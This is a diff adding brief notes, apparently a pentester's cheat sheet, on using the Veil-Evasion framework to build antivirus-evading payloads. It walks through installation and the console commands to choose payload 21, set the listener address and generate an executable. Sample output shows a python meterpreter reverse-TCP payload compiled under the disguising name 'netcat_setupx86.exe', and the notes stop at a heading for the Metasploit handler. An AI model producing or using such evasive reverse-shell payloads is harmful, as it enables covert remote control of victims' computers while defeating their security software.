@@ -1,0 +1,40 @@
+Veil Evasion - Evading anti virus detection for payloads
+
++ Installing Veil Evasion
+	# apt-get install veil-evasion
+	
++ Run the veil-evasion for first time to install veil-evasion and run everything using default configuration especially for all the dependency required
+
++ Starting Veil Evasion
+	# veil
+	
++ Creating payload
+	++ Select Evasion
+		# use 1
+	++ list all available payloads
+		# list
+	++ use specific payload
+		# use 21
+	++ set the option of the payload as you desire
+		# set LHOST xxx.xxx.xxx.xxx
+	++ generate the payload
+		# generate
+	++ Input name of the payload
+	++ Select payload executable
+	++ Once payload is created it will provide you the information about the payload
+	++ example
+
+	===============================================================================
+									   Veil-Evasion
+	===============================================================================
+		  [Web]: https://www.veil-framework.com/ | [Twitter]: @VeilFramework
+	===============================================================================
+
+	 [*] Language: python
+	 [*] Payload Module: python/meterpreter/rev_tcp
+	 [*] Executable written to: /var/lib/veil/output/compiled/netcat_setupx86.exe
+	 [*] Source code written to: /var/lib/veil/output/source/netcat_setupx86.py
+	 [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/netcat_setupx86.rc
+
+
++ Create meterpreter handler using MSF Console
